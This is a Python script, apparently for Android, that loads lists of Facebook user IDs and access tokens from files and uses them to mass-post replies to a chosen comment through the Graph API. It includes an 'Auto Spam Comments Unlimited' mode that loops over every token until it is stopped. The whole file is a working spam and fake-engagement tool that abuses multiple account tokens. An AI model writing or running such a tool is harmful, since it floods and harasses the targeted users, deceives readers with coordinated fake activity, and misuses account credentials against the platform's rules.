import requests
import time

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def reply_to_comment_on_facebook(same_replies, num_replies, fast_sharing):
    user_ids = get_ids_tokens('/sdcard/Test/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/Test/toka.txt')
    comment_id = input('Enter the comment ID to reply to: ')
    
    if same_replies:
        reply_text = input('Enter the reply text (for all replies): ')
    else:
        reply_texts = [input(f'Enter reply text {i + 1}: ') for i in range(num_replies)]

    replies_count = 0

    for i in range(len(user_ids)):
        if replies_count >= num_replies:
            print(f"Successfully made {num_replies} replies.")
            return
        
        user_id = user_ids[i]
        access_token = access_tokens[i]

        try:
            if same_replies:
                text_to_use = reply_text
            else:
                text_to_use = reply_texts[replies_count]  # Use different reply for each comment

            url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
            params = {'access_token': access_token, 'message': text_to_use}
            response = requests.post(url, params=params)

            if response.status_code == 200:
                replies_count += 1
                print(f"Successfully replied to comment {comment_id}")
            else:
                print(f"Failed to reply to comment {comment_id}")

            if not fast_sharing:
                time.sleep(2)  # Simulate slower sharing with a delay

        except requests.exceptions.RequestException as error:
            print(f"Failed to reply to comment {comment_id}")

    if replies_count < num_replies:
        print(f"Only {replies_count} replies were made.")

def auto_spam_comments(fast_sharing):
    user_ids = get_ids_tokens('/sdcard/Test/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/Test/toka.txt')
    comment_id = input('Enter the comment ID to spam: ')
    reply_text = input('Enter the spam comment text: ')

    spam_count = 0
    while True:
        for i in range(len(user_ids)):
            user_id = user_ids[i]
            access_token = access_tokens[i]

            try:
                url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
                params = {'access_token': access_token, 'message': reply_text}
                response = requests.post(url, params=params)

                if response.status_code == 200:
                    spam_count += 1
                    print(f"Spam comment #{spam_count} successfully posted.")
                else:
                    print(f"Failed to spam comment {comment_id}")

                if not fast_sharing:
                    time.sleep(2)  # Simulate slower sharing with a delay

            except requests.exceptions.RequestException as error:
                print(f"Failed to spam comment {comment_id}")

        cont = input("Do you want to continue spamming? (yes/no): ").lower()
        if cont != 'yes':
            print(f"Stopped after {spam_count} spam comments.")
            break

def main_menu():
    while True:
        print("\nMain Menu")
        print("1. Reply to a comment on Facebook")
        print("2. Auto Spam Comments Unlimited")
        print("3. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == '1':
            print("Choose reply type:")
            print("1. Same Replies")
            print("2. Different Replies")
            reply_type = input("Enter your choice: ")

            fast_choice = input("Enable fast sharing? (yes/no): ").lower()
            fast_sharing = fast_choice == 'yes'

            if reply_type == '1':
                num_replies = int(input('Enter the number of replies to make: '))
                reply_to_comment_on_facebook(same_replies=True, num_replies=num_replies, fast_sharing=fast_sharing)
            elif reply_type == '2':
                num_replies = int(input('Enter the number of replies to make: '))
                reply_to_comment_on_facebook(same_replies=False, num_replies=num_replies, fast_sharing=fast_sharing)
            else:
                print("Invalid choice. Please try again.")
        elif choice == '2':
            fast_choice = input("Enable fast sharing? (yes/no): ").lower()
            fast_sharing = fast_choice == 'yes'
            auto_spam_comments(fast_sharing)
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()